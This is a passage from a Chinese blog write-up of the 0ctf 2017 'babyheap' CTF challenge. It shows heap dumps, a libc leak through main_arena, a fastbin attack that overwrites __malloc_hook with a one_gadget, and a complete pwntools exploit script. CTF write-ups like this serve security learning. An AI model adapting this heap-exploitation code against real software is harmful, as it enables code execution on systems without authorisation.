class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658070</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c4--&gt;   <span class="number">0x55564f658080</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000091</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658090</span>:	<span class="number">0x25699b78</span>	<span class="number">0x00007fda</span>	<span class="number">0x25699b78</span>	<span class="number">0x00007fda</span></span><br><span class="line">        <span class="number">0x55564f6580a0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580b0</span>:	<span class="number">0x00002180</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580c0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580d0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580e0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f6580f0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658100</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">c5--&gt;   <span class="number">0x55564f658110</span>:	<span class="number">0x00000090</span>	<span class="number">0x00000000</span>	<span class="number">0x00000070</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658120</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658130</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">        <span class="number">0x55564f658140</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
+<p>bin情况，可以看到指向了main_arena+88</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line"><span class="built_in">all</span>: <span class="number">0x56252d3df080</span> —▸ <span class="number">0x7f8a54b1db78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x56252d3df080</span></span><br></pre></td></tr></table></figure>
+<p>输出 main_arena+88</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: \x0a&#x27;</span>)</span><br><span class="line">main_arena_add_88=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_add_88))</span><br><span class="line">+续</span><br></pre></td></tr></table></figure>
+<p>计算libc基址 ,因为main_arena比__malloc_hook相差高 0x10，所以就计算出其再libc中的相对地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line">main_arena_offset = ELF(<span class="string">&quot;libc.so.6&quot;</span>).symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line">malloc_hook=libc_base+elf.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="comment">#计算出malloc_hook地址</span></span><br><span class="line">+续</span><br></pre></td></tr></table></figure>
+<p>然后，因为malloc附近有可以构造利用的块一般就是地址开头的0x7f，所以申请0x60大小，才可以申请下来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+续</span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id4,c4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(malloc_hook-<span class="number">0x23</span>)<span class="comment">#构造一个0x7f大小的c6</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+<p>此时的堆情况，可以看到本来的c4被我们移到了fast bin链，并指向malloc_hook前面的一个伪造块，_IO_wide_data_0+301&#x3D;&amp;malloc_hook+0x23</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x564cb69f1080</span> —▸ <span class="number">0x7f3fc6e35aed</span> (_IO_wide_data_0+<span class="number">301</span>) ◂— <span class="number">0x3fc6af6ea0000000</span></span><br></pre></td></tr></table></figure>
+<p>申请伪造块，填充malloc_hook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id4,c4</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id6,c6，申请刚刚构造的伪chunk</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xf1147</span>,<span class="number">0xf02a4</span>,<span class="number">0x4526a</span>,<span class="number">0x45216</span>] <span class="comment">#remote根据libc版本确定</span></span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">payload=p8(<span class="number">0x00</span>)*<span class="number">0x13</span>+p64(one_gadget) <span class="comment">#malloc_hook离c6数据区头有0x13个距离</span></span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)触发</span><br><span class="line">+续</span><br></pre></td></tr></table></figure>
+<p>最终exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./babyheap&quot;</span>) <span class="comment">#名字太长，我给重命名了。</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,26653)</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;../libc6_2.23.so&#x27;)#题目提示ubuntu 16，所以一般用的是64位 2.23</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<span class="comment">#本地</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#id0,c0</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#id1,c1</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#id2,c2</span></span><br><span class="line">alloc(<span class="number">0x10</span>);<span class="comment">#id3,c3</span></span><br><span class="line">alloc(<span class="number">0x80</span>);<span class="comment">#id4,c4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p8(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">paylaod=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#id1,c2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#id2,c4</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x00</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id5,c5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: \x0a&#x27;</span>)</span><br><span class="line">main_arena=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line"></span><br><span class="line">main_arena_offset = elf.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line">malloc_hook=libc_base+elf.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#id4,c4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(malloc_hook-<span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0xf1147,0xf02a4,0x4526a,0x45216] #remote</span></span><br><span class="line">one =[<span class="number">0x4527a</span>] <span class="comment">#local</span></span><br><span class="line">one_gadget = libc_base + one[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">payload=p8(<span class="number">0x00</span>)*<span class="number">0x13</span>+p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()<span class="comment">#交互</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-223461.htm">0ctf2017 - babyheap </a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%80%BB%E8%BE%91"><span class="toc-number">3.</span> <span class="toc-text">利用逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%87%86%E5%A4%87"><span class="toc-number">4.1.</span> <span class="toc-text">基本准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">4.2.</span> <span class="toc-text">泄露libc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&text=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&is_video=false&description=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-PWN-0ctf_2017_babyheap&body=Check out this article: http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&title=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&name=BUUCTF-PWN-0ctf_2017_babyheap&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/&t=BUUCTF-PWN-0ctf_2017_babyheap"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
